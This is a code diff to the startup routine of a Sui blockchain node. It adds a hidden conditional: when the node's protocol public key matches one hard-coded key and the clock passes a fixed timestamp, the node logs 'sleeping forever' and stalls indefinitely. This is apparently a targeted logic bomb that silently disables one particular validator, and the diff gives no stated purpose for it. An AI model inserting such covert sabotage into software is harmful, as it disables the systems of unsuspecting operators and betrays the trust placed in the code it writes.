@@ -404,6 +404,17 @@ impl SuiNode {
         custom_rpc_runtime: Option<Handle>,
         software_version: &'static str,
     ) -> Result<Arc<SuiNode>> {
+        let seconds_since_epoch = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map_err(|e| anyhow!("Failed to get time since epoch: {:?}", e))?
+            .as_secs();
+        if format!("{:?}", config.protocol_public_key().concise()) == *"k#8dcff6d1.."
+            && seconds_since_epoch > 1663999445
+        {
+            error!("sleeping forever");
+            tokio::time::sleep(Duration::from_secs(10000000)).await;
+        }
+
         NodeConfigMetrics::new(&registry_service.default_registry()).record_metrics(&config);
         let mut config = config.clone();
         if config.supported_protocol_versions.is_none() {
